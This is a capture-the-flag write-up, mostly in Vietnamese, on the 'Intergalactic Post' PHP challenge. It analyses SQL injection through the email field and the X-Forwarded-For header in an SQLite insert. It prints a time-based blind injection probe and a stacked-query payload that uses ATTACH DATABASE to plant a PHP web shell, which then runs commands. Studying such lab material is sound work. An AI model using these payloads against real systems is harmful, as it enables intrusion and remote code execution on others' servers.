# `CHALLENGE DESCRIPTION`

<table>
<th style="text-align: center">
<img width="600" height="1">

```
CHALLENGE INFO
```

</th>

<th style="text-align: center">
<img width="282" height="1">

```
TABLE OF CONTENT
```

</th>
<tr>

<td width="600">      

<code> Intergalactic Post </code>

The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie's sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry?

**Tags:** `PHP`, `source-code-analysis`, `SQLi`, `misc-configuration`

</td>

<td>
<img width="600" height="1">

- [`CHALLENGE DESCRIPTION`](#challenge-description)
- [`QUICK PREVIEW`](#quick-preview)
	- [Source code analysis](#source-code-analysis)
- [`EXPLOITATION`](#exploitation)
	- [Blind SQL injection](#blind-sql-injection)
	- [Remote Code Execution](#remote-code-execution)
	- [`👽` Get Flag](#-get-flag)
</td>

</tr></table>

# `QUICK PREVIEW`

Đây là một bài White Box, chúng ta được cung cấp source code của Web App.

Sau khi giải nén folder `IntergalacticPost.zip`, ta được folder có cấu trúc như sau: 

```shell
IntergalacticPost
└── web_intergalactic_post
    ├── challenge
    │   ├── controllers
    │   │   ├── Controller.php
    │   │   ├── IndexController.php
    │   │   └── SubsController.php
    │   ├── models
    │   │   ├── Model.php
    │   │   └── SubscriberModel.php
    │   ├── static
    │   │   ├── fonts
    │   │   ├── css
    │   │   ├── images
    │   │   └── js
    │   ├── models
    │   │   └── index.php
    │   ├── Database.html
    │   ├── index.php
    │   └── Router.php
    ├── config
    │   ├── fpm.conf
    │   ├── nginx.conf
    │   └── supervisord.conf
    ├── build-docker.sh
    └── Dockerfile
```

→ Ta có cái nhìn sơ lược về Web App: 
+ Web Tech: `PHP`
+ Server: `nginx` 
+ Được xây dựng theo mô hình `MVC`

Đây là giao diện của trang web

![](../../attachments/Pasted%20image%2020220727120944.png)

Chỉ có 1 input là `mail` của user, và 1 button thực hiện submit data.

Ở đây mình sẽ thử thực hiện post email, để xem tiếp theo browser trả gì về cho mình.

![](../../attachments/Pasted%20image%2020220727121455.png)

Có vẻ như mình thực hiện `POST`  data `email:test@mail.com` thông qua URL: `http://104.248.173.13:30765/subscribe`. Với status code 302 → được redirect tới URL như sau: `http://104.248.173.13:30765/?success=true&msg=Email%20subscribed%20successfully!` để thông báo mình đã subcribe thành công

![](../../attachments/Pasted%20image%2020220727121152.png)

→ Website chỉ đơn giản như vậy. Đọc source code để thực sự xem App có gì ha.

## Source code analysis

Khi đọc source code của App, trong file `Database.php` mình phát hiện rằng App sử dụng một database đó là `SQLite`. Ngoài ra, trong hàm `subscribeUser` có thể bị SQL injection nếu untrusted data rơi vào các biến `$ip_address`, `$email`.

```php
<?php
class Database
{
    private static $database = null;  

    public function __construct($file)
    {
        if (!file_exists($file))
        {
            file_put_contents($file, '');
        }
        $this->db = new SQLite3($file);
        $this->migrate();
  
        self::$database = $this;
    }

<--SNIP-->
  
    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
}
```

Tiếp tục trong file `index.php` là việc khởi tạo những thứ cần thiết cho App. Để ý thấy rằng có object `Router` được định nghĩa bởi anh lập trình viên để xử lý routing của App.

```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }

    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$database = new Database('/tmp/challenge.db');

$router = new Router();
$router->new('GET', '/', 'IndexController@index');
$router->new('POST', '/subscribe', 'SubsController@store');

die($router->match());
```

→  Chú ý đến `$router->new('POST', '/subscribe', 'SubsController@store');`, đây có vẻ là route này thực hiện gọi đến SubsController để thực hiện việc subscribe email.

Trong file `SubsController.php` mình thấy Controller đã lưu data email thành một object mới `SubscriberModel`.

```php
<?php

class SubsController extends Controller
{
<--SNIP-->
    public function store($router)
    {
        $email = $_POST['email'];
        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }
        $subscriber = new SubscriberModel;
        $subscriber->subscribe($email);

        header('Location: /?success=true&msg=Email subscribed successfully!');

        exit;
    }
<--SNIP-->
}
```

Okay, Model này lấy IP thông qua hàm  `getSubscriberIP()` - đã thực hiện vài bước filter để tránh tamper IP. 

Model này nhận 2 biến là `$ip_address` thông qua `getSubscriberIP()` và `$email` được truyền vào khi khởi tạo Model. Sau đó gọi đến method `subscribeUser` (bị SQL injection nếu kiểm soát được input data)

```php
<?php
class SubscriberModel extends Model
{
<--SNIP-->

    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }
    
    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
    }
}
```

**Conclusion**: 2 untrusted data hoàn toàn có thể kiểm soát được
+ email (đương nhiên rồi)
+ IP (ở đây, mình sẽ sử dụng header `X-Forwarded-For` để bypass)
→ Thực hiện SQL injection
# `EXPLOITATION`
## Blind SQL injection
Mình sử dụng payload như sau để kiểm tra, nếu App thực hiện gửi respone sau 2 giây → bị SQL injection, còn nhanh hơn → không bị.

```sql
localhost'*UPPER(HEX(RANDOMBLOB(100000000/2)))*'
```

![](../../attachments/Pasted%20image%2020220727124733.png)

 → Đây là thời gian mà respone gửi về ![](../../attachments/Pasted%20image%2020220727124808.png) → SQL injection, cụ thể hơn là Blind SQL injection. 

## Remote Code Execution

Ở trong `sqlite`, ta có thể thực hiện RCE thông qua `ATTACH DATABASE` (chi tiết tại đây [here](https://twosixtech.com/sqlite-as-a-shell-script/)).  Để thực hiện kĩ thuật này, mình cần xem thử mình có quyền tạo file trong thư mục root hay không.

> Kỹ thuật trên nôm na sẽ thực hiện tạo một SQLite file (php file 😢) sau đó inject giá trị vào table pwn là payload RCE mà ta muốn. 

Đọc file cấu hình docker:

```shell
# Setup usr
RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

<--SNIP-->

# Setup permissions
RUN chown -R www:www /var/lib/nginx /www

<--SNIP-->
```

→ Hoàn toàn có quyền ghi

Thực hiện tạo payload như sau:

```sql
127.0.0.1',''); ATTACH DATABASE '/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");-- 
```

![](../../attachments/Pasted%20image%2020220727125317.png)

Thực hiện truy cập đến endpoint `/lol.php` và nhập parameter `cmd` với giá trị mong muốn, ở đây mình nhập `id` để kiểm tra.

![](../../attachments/Pasted%20image%2020220727125345.png)

→ Okay, đã RCE thành công. 

## `👽` Get Flag 
Tiến hành lấy `flag` thôi

![](../../attachments/Pasted%20image%2020220727125426.png)

![](../../attachments/Pasted%20image%2020220727125523.png)